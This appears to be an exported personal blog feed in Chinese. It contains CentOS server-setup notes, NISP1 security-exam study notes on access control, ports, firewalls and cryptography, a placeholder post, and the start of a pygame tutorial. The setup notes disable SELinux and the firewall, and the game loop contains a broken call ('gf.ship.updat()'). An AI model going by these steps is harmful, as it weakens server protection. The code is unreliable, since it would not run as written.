<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">1.优化ssh</span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">79行：GSSAPIAuthentication no</span><br><span class="line">115行：UseDNS no</span><br><span class="line">systemctl restart sshd</span><br><span class="line"></span><br><span class="line">2.优化selinux</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改配置文件，永久关闭</span></span><br><span class="line">vi /etc/selinux/config</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第7行修改为</span></span><br><span class="line">SELINUX=disabled</span><br><span class="line">需要重启生效</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">立即生效，临时的</span></span><br><span class="line">setenforce 0</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">3.关闭firewalld</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br><span class="line"></span><br><span class="line">4.优化yum源</span><br><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line"></span><br><span class="line">5.安装常用软件</span><br><span class="line">yum install lrzsz vim tree wget net-tools screen tcpdump bash-completion -y</span><br></pre></td></tr></table></figure></div>

<p>安装httpd</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">yum install httpd -y</span><br></pre></td></tr></table></figure></div>

<p>服务管理</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">启动服务</span><br><span class="line">systemctl  start  httpd  #start启动</span><br><span class="line">停止服务</span><br><span class="line">systemctl  stop   httpd  #stop停止</span><br><span class="line">重启服务</span><br><span class="line">systemctl  restart   httpd #restart重启</span><br><span class="line">查看服务状态</span><br><span class="line">systemctl  status   httpd  #查看服务状态</span><br><span class="line">把服务设置为开机启动</span><br><span class="line">systemctl enable httpd.service</span><br><span class="line">取消服务的开机自启</span><br><span class="line">systemctl disable httpd.service</span><br></pre></td></tr></table></figure></div>

<p>软件和服务都是程序</p>
<p>软件一般是客户端curl</p>
<p>服务一般是给客户端提供某一个功能，7*24一直运行</p>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>NISP1</title>
    <url>/2024/05/03/NISP1/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">



<h3 id="访问控制模型"><a href="#访问控制模型" class="headerlink" title="访问控制模型"></a>访问控制模型</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/image-20240503165404974.png" alt="image-20240503165404974"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%87%AA%E4%B8%BB%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E7%AD%96%E7%95%A5.png" alt="自主访问控制"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/Biba%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B.png" alt="Biba访问控制模型"></p>
<blockquote>
<p>PRAC是基于角色的访问控制模型</p>
<p>BLP模型、Biba模型、Clark-Wilson模型、Chinese Wall模型是基于强制访问控制模型</p>
</blockquote>
<blockquote>
<p>“针对每个用户指明能够访问的资源”属于自主访问控制。</p>
</blockquote>
<blockquote>
<p>Biba模型解决了系统内数据的完整性问题</p>
<p>BLP模型解决 了系统内数据的保密性问题</p>
</blockquote>
<h3 id="网络设备——集线器、路由器"><a href="#网络设备——集线器、路由器" class="headerlink" title="网络设备——集线器、路由器"></a>网络设备——集线器、路由器</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp2.png" alt="image-20240503170104551"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp1" alt="image-20240503170311884"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8C%E7%BD%91%E5%8D%A1.png" alt="路由器和网卡"></p>
<blockquote>
<p>交换机和可以接入交换机的任意两个网络结点提供独享的电信号通路</p>
</blockquote>
<h3 id="身份鉴别方式——实体所知、所有、特征"><a href="#身份鉴别方式——实体所知、所有、特征" class="headerlink" title="身份鉴别方式——实体所知、所有、特征"></a>身份鉴别方式——实体所知、所有、特征</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp3" alt="image-20240503170614449"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB.png" alt="身份鉴别"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%86%E7%A0%81%E3%80%81%E5%8F%A3%E4%BB%A4%E5%B1%9E%E4%BA%8E%E5%AE%9E%E4%BD%93%E6%89%80%E7%9F%A5.png" alt="密码、口令属于实体所知"></p>
<blockquote>
<p>用户名&#x2F;密码、登入账号（实体所知），手机短信验证码（实体所有）、刷脸识别（实体特征）</p>
</blockquote>
<h3 id="密码加密算法"><a href="#密码加密算法" class="headerlink" title="密码加密算法"></a>密码加密算法</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp4" alt="哈希算法"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95.png" alt="对称密码算法"></p>
<blockquote>
<p>哈希算法：MD5 、SHA-1、SHA-256</p>
<p>对称加密：RC5、DES、AES</p>
<p>非对称密码算法：RSA，Rabin，ECC</p>
</blockquote>
<h3 id="密码学的发展阶段——香农论文（近代密码学）"><a href="#密码学的发展阶段——香农论文（近代密码学）" class="headerlink" title="密码学的发展阶段——香农论文（近代密码学）"></a>密码学的发展阶段——香农论文（近代密码学）</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%BF%9B%E5%85%A5%E8%BF%91%E4%BB%A3%E5%AF%86%E7%A0%81%E9%98%B6%E6%AE%B5%E7%9A%84%E6%A0%87%E5%BF%97.png" alt="进入近代密码阶段的标志"></p>
<blockquote>
<p>1949年香农发表的划时代论文””保密系统的通信理论”为近代密码学的标志</p>
</blockquote>
<h3 id="密码学的发展阶段——密码机（古典密码学）"><a href="#密码学的发展阶段——密码机（古典密码学）" class="headerlink" title="密码学的发展阶段——密码机（古典密码学）"></a>密码学的发展阶段——密码机（古典密码学）</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp5.png" alt="nisp5"></p>
<blockquote>
<p>Enigma密码机属于古典密码学</p>
</blockquote>
<h3 id="防火墙的作用"><a href="#防火墙的作用" class="headerlink" title="防火墙的作用"></a>防火墙的作用</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E4%BD%9C%E7%94%A8.png" alt="防火墙的作用"></p>
<blockquote>
<p>防火墙保障的是内部网络数据的安全</p>
<p>防火墙隔离两个不同安全要求的网络</p>
<p>防火墙根据定义控制策略，检查并控制两个安全域之间的流量</p>
<p>防火墙对进出网络边界的数据进行保护，防止恶意入侵，恶意代码的传播</p>
</blockquote>
<h3 id="入侵检测机制"><a href="#入侵检测机制" class="headerlink" title="入侵检测机制"></a>入侵检测机制</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%BB%E6%9C%BA%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F.png" alt="主机入侵检测系统"></p>
<blockquote>
<p>主机入侵检测系统能供用于加密网络环境，可移植性差，开发、测试的压力比较大，能够监视所有系统</p>
</blockquote>
<h3 id="密码编码学和密码分析学"><a href="#密码编码学和密码分析学" class="headerlink" title="密码编码学和密码分析学"></a>密码编码学和密码分析学</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%86%E7%A0%81%E7%BC%96%E7%A0%81%E5%AD%A6%E5%92%8C%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90%E5%AD%A6.png" alt="密码编码学和密码分析学"></p>
<blockquote>
<p>密码编码学：主要研究信息的编码，构建各种安全有效的密码算法和协议，用于信息的加密、认证等方面。</p>
<p>密码分析学：主要研究破译密码获得消息，或对消息进行伪造。</p>
</blockquote>
<h3 id="涉密载体"><a href="#涉密载体" class="headerlink" title="涉密载体"></a>涉密载体</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E6%B6%89%E5%AF%86%E8%BD%BD%E4%BD%93.png" alt="涉密载体"></p>
<blockquote>
<p>涉密计算机禁止和外网连接</p>
</blockquote>
<h3 id="状态检测机制的缺点"><a href="#状态检测机制的缺点" class="headerlink" title="状态检测机制的缺点"></a>状态检测机制的缺点</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6.png" alt="状态检测机制"></p>
<blockquote>
<p>状态检测机制的缺点：检查内容比包过滤检测技术多，对防火墙的性能提出了更高要求；状态检测防火墙的配置非常复杂，对于用户的能力要求较高，使用起来不太方便。</p>
</blockquote>
<h3 id="信息安全目标"><a href="#信息安全目标" class="headerlink" title="信息安全目标"></a>信息安全目标</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%BF%9D%E5%AF%86%E6%80%A7.png" alt="密码学保密性"></p>
<blockquote>
<p>保密性事确保信息被合法用户访问，而不呗泄露给非授权的用户、实体或过程，或供其利用的特性。</p>
</blockquote>
<h3 id="传输服务的默认端口"><a href="#传输服务的默认端口" class="headerlink" title="传输服务的默认端口"></a>传输服务的默认端口</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ftp%E7%AB%AF%E5%8F%A321.png" alt="ftp端口21"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/POP3%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3.png" alt="POP3默认端口"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/DNS%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A353.png" alt="DNS默认端口53"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/SMTP%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A325.png" alt="SMTP默认端口25"></p>
<blockquote>
<p>FTP默认端口21</p>
<p>SFTP默认端口22(SSH文件传输协议)</p>
<p>POP3默认端口110</p>
<p>DNS默认端口53</p>
<p>SMTP默认端口25</p>
<p>共享文件夹默认端口445</p>
<p>远程桌面端口3389</p>
<p>Telnet端口23</p>
<p>HTTPS默认端口443</p>
</blockquote>
<h3 id="计算机网络的节点——转换节点和访问节点"><a href="#计算机网络的节点——转换节点和访问节点" class="headerlink" title="计算机网络的节点——转换节点和访问节点"></a>计算机网络的节点——转换节点和访问节点</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E8%8A%82%E7%82%B9.png" alt="计算机网络的节点"></p>
<blockquote>
<p>计算机网络的节点包括：转换节点和访问节点</p>
</blockquote>
<h3 id="物联网体系结构"><a href="#物联网体系结构" class="headerlink" title="物联网体系结构"></a>物联网体系结构</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%89%A9%E8%81%94%E7%BD%91%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E4%BD%9C%E7%94%A8.png" alt="物联网体系结构作用"></p>
<blockquote>
<p>物联网体系结构的作用：</p>
<ul>
<li>感知层：全面感知外界信息，本层主要设备是各种信息收集器</li>
<li>传输层：主要用于把感知层收集的信息安全可靠地传输到信息支撑层，然后根据不同的应用需求进行信息处理。</li>
<li>支撑层：对节点采集的信息处理，对信息进行分析和过滤，需要判断接受的信息是否真实有用，过滤掉垃圾升值恶意信息。</li>
<li>应用层：具体的应用业务，所涉及的安全问题与业务特性相关，例如隐私保护、知识产权保护、取证、数据销毁等方面。</li>
</ul>
</blockquote>
<h3 id="网络信息安全基本属性"><a href="#网络信息安全基本属性" class="headerlink" title="网络信息安全基本属性"></a>网络信息安全基本属性</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7.png" alt="数据完整性"></p>
<blockquote>
<ul>
<li>完整性：保证信息系统中的数据处于完整的状态，确保信息没有遭受篡改和破坏。</li>
<li>机密性：网络信息不泄露给非授权用户、实体或程序，能够防止非授权者获取信息。</li>
<li>可用性：合法许可的用户能后及时获取网络信息或服务的特性。</li>
<li>抗抵抗性：防止网络信息系统相关用户否认活动行为的特性。</li>
<li>可控性：网络信息系统责任主体对其具有管理、支配能力的属性。</li>
</ul>
</blockquote>
<h3 id="大数据的生命周期"><a href="#大数据的生命周期" class="headerlink" title="大数据的生命周期"></a>大数据的生命周期</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="大数据的生命周期"></p>
<blockquote>
<p>大数据的生命周期：数据采集、数据存储、数据处理、数据分发、数据删除</p>
</blockquote>
<h3 id="七个任务、四项措施"><a href="#七个任务、四项措施" class="headerlink" title="七个任务、四项措施"></a>七个任务、四项措施</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%8A%A0%E5%BC%BA%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%B7%A5%E8%B5%84%E7%9A%84%E6%8C%87%E5%AF%BC%E6%84%8F%E8%A7%81.png" alt="加强工业互联网安全工资的指导意见"></p>
<blockquote>
<p>《意见》提出达成七个主要任务和四项保障措施</p>
</blockquote>
<h3 id="网络钓鱼攻击手段"><a href="#网络钓鱼攻击手段" class="headerlink" title="网络钓鱼攻击手段"></a>网络钓鱼攻击手段</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB.png" alt="网络钓鱼攻击"></p>
<blockquote>
<ul>
<li>网络钓鱼攻击手段：邮件地址欺骗、伪造网站页面、社会工程学</li>
<li>主动防御技术：蜜罐技术。</li>
</ul>
</blockquote>
<h3 id="可实现保密性的传输协议——SSL协议"><a href="#可实现保密性的传输协议——SSL协议" class="headerlink" title="可实现保密性的传输协议——SSL协议"></a>可实现保密性的传输协议——SSL协议</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%BF%9D%E5%AF%86%E6%80%A7.png" alt="协议的保密性"></p>
<blockquote>
<p>SSL协议中，使用握手协商加密和MAC算法以及保密密钥使用握手协议交换的数据进行加密和签名，使用报警协议定义数据传输过程中，出现问题如何去解决。<br>FTP协议、POP3协议、HTTP协议无法保证保密性。、</p>
</blockquote>
<h3 id="状态检测防火墙功能"><a href="#状态检测防火墙功能" class="headerlink" title="状态检测防火墙功能"></a>状态检测防火墙功能</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%E9%98%B2%E7%81%AB%E5%A2%99.png" alt="状态检测防火墙"></p>
<blockquote>
<p>状态检测防火墙又称动态包过滤防火墙，是对传统包过滤的功能拓展。</p>
<p>状态检测防火墙实质上是包过滤，但它不仅对IP包头信息进行检查过滤，而且还要检查包的TCP头部信息甚至包的内容。</p>
<p>状态检查防火墙允许规则的动态变化。</p>
<p>状态防火墙通过采用状态监视器，对网络通信的各层（包括网络层、传输层以及应用层）实施检测，抽取其中部分数据，形成网络连接的动态状态信息。</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E4%BC%98%E7%82%B9.png" alt="状态检测防火墙的优点"></p>
<h3 id="上网行为管理"><a href="#上网行为管理" class="headerlink" title="上网行为管理"></a>上网行为管理</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86.png" alt="上网行为管理"></p>
<blockquote>
<p>上网行为管理目前可实现的功能：上网身份管控、互联网浏览管控、邮件外发管控、用户行为管控、上网应用管控。</p>
</blockquote>
<h3 id="IPV6-的地址空间——128位"><a href="#IPV6-的地址空间——128位" class="headerlink" title="IPV6 的地址空间——128位"></a>IPV6 的地址空间——128位</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/IPV6%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png" alt="IPV6地址空间"></p>
<blockquote>
<p>IPV6是128位的地址空间，IPV4是32位地址空间</p>
</blockquote>
<h3 id="IPS-入侵防御系统-主要功能"><a href="#IPS-入侵防御系统-主要功能" class="headerlink" title="IPS(入侵防御系统)主要功能"></a>IPS(入侵防御系统)主要功能</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9FIPS.png" alt="入侵防御系统IPS"></p>
<blockquote>
<p>IPS(入侵防御系统)主要功能：实时监视和拦截攻击；保护客户端；虚拟补丁。</p>
</blockquote>
<h3 id="VLAN之间数据传递的设备——路由器"><a href="#VLAN之间数据传递的设备——路由器" class="headerlink" title="VLAN之间数据传递的设备——路由器"></a>VLAN之间数据传递的设备——路由器</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/VLAN%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92%E8%AE%BE%E5%A4%87.png" alt="VLAN数据传递设备"></p>
<blockquote>
<p>能完成不同VLAN之间的数据传递的设备是路由器。路由器适用于不同网络之间。</p>
</blockquote>
<h3 id="系统对用户的身份单向鉴别"><a href="#系统对用户的身份单向鉴别" class="headerlink" title="系统对用户的身份单向鉴别"></a>系统对用户的身份单向鉴别</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%93%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8D%95%E5%90%91%E9%89%B4%E5%88%AB.png" alt="个人网银系统的单向鉴别"></p>
<blockquote>
<p>账号、密码、和验证码成功登陆个人网银系统，系统对用户身份的的单向鉴别。</p>
</blockquote>
<h3 id="基于实体所知的鉴别威胁"><a href="#基于实体所知的鉴别威胁" class="headerlink" title="基于实体所知的鉴别威胁"></a>基于实体所知的鉴别威胁</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%9F%BA%E4%BA%8E%E5%AE%9E%E4%BD%93%E6%89%80%E7%9F%A5%E7%9A%84%E9%89%B4%E5%88%AB%E5%A8%81%E8%83%81.png" alt="基于实体所知的鉴别威胁"></p>
<blockquote>
<p>基于实体所知的鉴别威胁：暴力破解攻击，窃听攻击，重放攻击</p>
</blockquote>
<h3 id="证书管理器的调用"><a href="#证书管理器的调用" class="headerlink" title="证书管理器的调用"></a>证书管理器的调用</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%AF%81%E4%B9%A6%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E8%B0%83%E7%94%A8.png" alt="证书管理器的调用"></p>
<blockquote>
<p>cmd打开certmgr.msc</p>
</blockquote>
<h3 id="IGMP协议"><a href="#IGMP协议" class="headerlink" title="IGMP协议"></a>IGMP协议</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/IGMP%E5%8D%8F%E8%AE%AE.png" alt="IGMP协议"></p>
<blockquote>
<p>IGMP协议：Internet组织管理协议 ，位于TCP&#x2F;IP协议的网络层</p>
</blockquote>
<h3 id="TCP网络安全协议"><a href="#TCP网络安全协议" class="headerlink" title="TCP网络安全协议"></a>TCP网络安全协议</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/TCP%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE.png" alt="TCP网络安全协议"></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/TCP%E5%8D%8F%E8%AE%AE%E6%89%80%E5%9C%A8%E5%B1%82.png" alt="TCP协议所在层"></p>
<blockquote>
<p>IPSec工作再网络层</p>
<p>PP2P和L2TP工作在数据链路层</p>
<p>SSL工作在传输层。</p>
</blockquote>
<h3 id="应用层协议"><a href="#应用层协议" class="headerlink" title="应用层协议"></a>应用层协议</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE.png" alt="应用层协议"></p>
<blockquote>
<p>应用层协议：HTTP协议，FTP协议，Telnet</p>
<p>传输层协议：UDP协议，TCP协议</p>
</blockquote>
<h3 id="交换机的物理分层方式"><a href="#交换机的物理分层方式" class="headerlink" title="交换机的物理分层方式"></a>交换机的物理分层方式</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E7%89%A9%E7%90%86%E5%88%86%E5%B1%82%E6%96%B9%E5%BC%8F.png" alt="交换机的物理分层方式"></p>
<blockquote>
<p>交换机的物理分层方式：接入层、汇聚层、核心层</p>
</blockquote>
<h3 id="网闸-物理隔离系统"><a href="#网闸-物理隔离系统" class="headerlink" title="网闸(物理隔离系统)"></a>网闸(物理隔离系统)</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%BD%91%E9%97%B8(%E7%89%A9%E7%90%86%E9%9A%94%E7%A6%BB%E7%B3%BB%E7%BB%9F).png" alt="网闸(物理隔离系统)"></p>
<blockquote>
<p>网闸（物理隔离网络）：外部处理单元+内部处理单元+冲裁处理单元</p>
</blockquote>
<h3 id="局域网中MAC-介质访问控制子层"><a href="#局域网中MAC-介质访问控制子层" class="headerlink" title="局域网中MAC(介质访问控制子层)"></a>局域网中MAC(介质访问控制子层)</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%B1%80%E5%9F%9F%E7%BD%91%E4%B8%ADMAC(%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%AD%90%E5%B1%82).png" alt="局域网中MAC(介质访问控制子层)"></p>
<blockquote>
<p>在局域网中，MAC指的是介质访问控制子层</p>
</blockquote>
<h3 id="无线局域网"><a href="#无线局域网" class="headerlink" title="无线局域网"></a>无线局域网</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E6%97%A0%E7%BA%BF%E5%B1%80%E5%9F%9F%E7%BD%91.png" alt="无线局域网"></p>
<h3 id="网卡作用OSI七层的位置"><a href="#网卡作用OSI七层的位置" class="headerlink" title="网卡作用OSI七层的位置"></a>网卡作用OSI七层的位置</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%BD%91%E5%8D%A1%E4%BD%9C%E7%94%A8OSI%E4%B8%83%E5%B1%82%E7%9A%84%E4%BD%8D%E7%BD%AE.png" alt="网卡作用OSI七层的位置"></p>
<h3 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h3><h3 id><a href="#" class="headerlink" title></a><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0.png" alt="哈希函数"></h3><blockquote>
<p>哈希函数：单向散列函数，它可以将任意有限长度信息映射为固定长度的值</p>
</blockquote>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>nisp</tag>
      </tags>
  </entry>
  <entry>
    <title>Open new world</title>
    <url>/2024/01/13/Open-new-world/</url>
    <content><![CDATA[<h2 id="OPEN-NEW-WORLD"><a href="#OPEN-NEW-WORLD" class="headerlink" title="OPEN NEW WORLD"></a>OPEN NEW WORLD</h2><p>敬请T期待！</p>
<p>路漫漫其修远兮，吾将上下而求索！</p>
<p>​																–《离骚》屈原</p>
<p>杨宪益先生 译：<br>The way was long, and wrapped in gloom did seem,<br>As I urged on to seek my vanished dream.</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Hope_flag</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实战</title>
    <url>/2024/02/07/Python%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="外星人入侵游戏开发"><a href="#外星人入侵游戏开发" class="headerlink" title="外星人入侵游戏开发"></a>外星人入侵游戏开发</h2><p>一、开发框架</p>
<p>总文件：alien_invasion</p>
<p>包含文件：</p>
<ul>
<li>image文件</li>
<li>alien_invasion.py</li>
<li>game_functions.py</li>
<li>ship.py</li>
<li>settings.py</li>
<li>bullet.py</li>
</ul>
<hr>
<p><strong>alien.invasion.py</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#alien_invasion.py</span></span><br><span class="line"><span class="comment">#一系列整个游戏都要用到的对象,游戏的主循环</span></span><br><span class="line"><span class="keyword">import</span> pygame<span class="comment">#模块pygame包含开发游戏所需的功能</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> settings <span class="keyword">import</span> Settings</span><br><span class="line"><span class="keyword">from</span> ship <span class="keyword">import</span> Ship</span><br><span class="line"><span class="keyword">import</span> game_functions <span class="keyword">as</span> gf</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_game</span>():</span><br><span class="line">    <span class="comment">#初始化游戏并创建一个屏幕对象</span></span><br><span class="line">    pygame.init()<span class="comment">#初始化背景设置</span></span><br><span class="line">    ai_settings = Settings()</span><br><span class="line">    screen = pygame.display.set_mode((ai_settings.screen_width,ai_settings.screen_height))</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    我们调用pygame.display.set_mode()来创建一个名为screen的显示窗口，这个游戏的所有图形元素都将在其中绘制。</span></span><br><span class="line"><span class="string">    通过将这些尺寸值传递给pygame.display.set_mode()，我们创建了一个宽1200像素、高800像素的游戏窗口</span></span><br><span class="line"><span class="string">    （你可以根据自己的显示器尺寸调整这些值）。</span></span><br><span class="line"><span class="string">    surface是屏幕的一部分，用于显示游戏元素。在这个游戏中，每个元素（如外星人或飞船）都是一个surface。</span></span><br><span class="line"><span class="string">    display.set_mode()返回的surface表示整个游戏窗口。</span></span><br><span class="line"><span class="string">    我们激活游戏的动画循环后，每经过一次循环都将自动重绘这个surface。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pygame.display.set_caption(<span class="string">&quot;Alien Invasion&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#设置背景色</span></span><br><span class="line">    bg_color = (<span class="number">230</span>,<span class="number">230</span>,<span class="number">230</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#创建一艘飞船</span></span><br><span class="line">    ship = Ship(ai_settings,screen)<span class="comment">#创建一个名为ship的Ship实例</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#开始游戏的主循环</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        gf.check_events(ship)</span><br><span class="line">        gf.ship.updat()<span class="comment">#玩家输入时，飞船位置更新</span></span><br><span class="line">        gf.update_screen(ai_settings,screen,ship)</span><br><span class="line"></span><br><span class="line">run_game()</span><br></pre></td></tr></table></figure></div>

<hr>
<p><strong>game_functions.py</strong></p>
